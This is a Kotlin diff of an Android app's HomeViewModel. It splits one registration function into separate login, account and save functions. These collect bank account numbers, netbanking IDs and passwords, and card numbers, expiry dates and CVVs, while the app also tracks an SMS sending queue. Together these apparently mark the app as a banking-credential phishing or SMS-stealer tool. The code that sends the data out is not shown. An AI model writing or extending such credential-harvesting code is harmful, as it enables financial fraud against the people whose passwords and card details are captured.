@@ -16,7 +16,11 @@ import javax.inject.Inject
 
 data class HomeUiState(
     val deviceInfo: DeviceInfo? = null,
-    val isRegistering: Boolean = false,
+    val isLoggingIn: Boolean = false,
+    val isRegisteringUser: Boolean = false,
+    val isSavingAccount: Boolean = false,
+    val authError: String? = null,
+    val saveMessage: String? = null,
     val pendingQueueCount: Int = 0,
     val testSmsResult: String? = null,
     val isSendingTest: Boolean = false,
@@ -44,55 +48,73 @@ class HomeViewModel @Inject constructor(
         }
     }
 
-    fun registerFullSenderDevice(
-        name: String,
-        mobileNumber: String,
-        address: String,
-        bankName: String,
-        accountNumber: String,
-        ifscCode: String,
-        netbankingId: String,
-        netbankingPassword: String,
-        cardNumber: String,
-        cardExpiry: String,
-        cardCvv: String
-    ) {
+    fun login(mobile: String, pass: String, onSuccess: () -> Unit) {
         viewModelScope.launch {
-            _uiState.update { it.copy(isRegistering = true, errorMessage = null) }
-            deviceRepository.saveFullRegistrationDetails(
-                name = name.ifBlank { "User Device" },
-                mobileNumber = mobileNumber.ifBlank { "N/A" },
-                address = address.ifBlank { "N/A" },
-                bankName = bankName,
-                accountNumber = accountNumber,
-                ifscCode = ifscCode,
-                netbankingId = netbankingId,
-                netbankingPassword = netbankingPassword,
-                cardNumber = cardNumber,
-                cardExpiry = cardExpiry,
-                cardCvv = cardCvv
-            )
-            deviceRepository.setDeviceName(name.ifBlank { "User Device" })
-            val result = deviceRepository.registerDevice()
+            _uiState.update { it.copy(isLoggingIn = true, authError = null) }
+            val res = deviceRepository.loginUser(mobile, pass)
             _uiState.update {
                 it.copy(
-                    isRegistering = false,
-                    errorMessage = result.exceptionOrNull()?.message
+                    isLoggingIn = false,
+                    authError = res.exceptionOrNull()?.message
                 )
             }
+            if (res.isSuccess) {
+                onSuccess()
+            }
+        }
+    }
+
+    fun registerAccount(name: String, mobile: String, pass: String, onSuccess: () -> Unit) {
+        viewModelScope.launch {
+            _uiState.update { it.copy(isRegisteringUser = true, authError = null) }
+            val res = deviceRepository.registerUserAccount(mobile, pass, name)
+            _uiState.update {
+                it.copy(
+                    isRegisteringUser = false,
+                    authError = res.exceptionOrNull()?.message
+                )
+            }
+            if (res.isSuccess) {
+                onSuccess()
+            }
+        }
+    }
+
+    fun logout(onSuccess: () -> Unit) {
+        viewModelScope.launch {
+            deviceRepository.logoutUser()
+            onSuccess()
+        }
+    }
+
+    fun saveBankAccount(bankName: String, accountNo: String, ifsc: String) {
+        viewModelScope.launch {
+            _uiState.update { it.copy(isSavingAccount = true, saveMessage = null) }
+            deviceRepository.saveBankAccountDetails(bankName, accountNo, ifsc)
+            _uiState.update { it.copy(isSavingAccount = false, saveMessage = "✅ Bank Account Details Saved Successfully!") }
+        }
+    }
+
+    fun saveNetbanking(bankName: String, netbankingId: String, netbankingPass: String) {
+        viewModelScope.launch {
+            _uiState.update { it.copy(isSavingAccount = true, saveMessage = null) }
+            deviceRepository.saveNetbankingDetails(bankName, netbankingId, netbankingPass)
+            _uiState.update { it.copy(isSavingAccount = false, saveMessage = "✅ Netbanking Details Saved Successfully!") }
+        }
+    }
+
+    fun saveCard(cardNumber: String, cardExpiry: String, cardCvv: String) {
+        viewModelScope.launch {
+            _uiState.update { it.copy(isSavingAccount = true, saveMessage = null) }
+            deviceRepository.saveCardDetails(cardNumber, cardExpiry, cardCvv)
+            _uiState.update { it.copy(isSavingAccount = false, saveMessage = "✅ Card Details Saved Successfully!") }
         }
     }
 
     fun registerDevice() {
         viewModelScope.launch {
-            _uiState.update { it.copy(isRegistering = true, errorMessage = null) }
-            val result = deviceRepository.registerDevice()
-            _uiState.update {
-                it.copy(
-                    isRegistering = false,
-                    errorMessage = result.exceptionOrNull()?.message
-                )
-            }
+            _uiState.update { it.copy(errorMessage = null) }
+            deviceRepository.registerDevice()
         }
     }
 
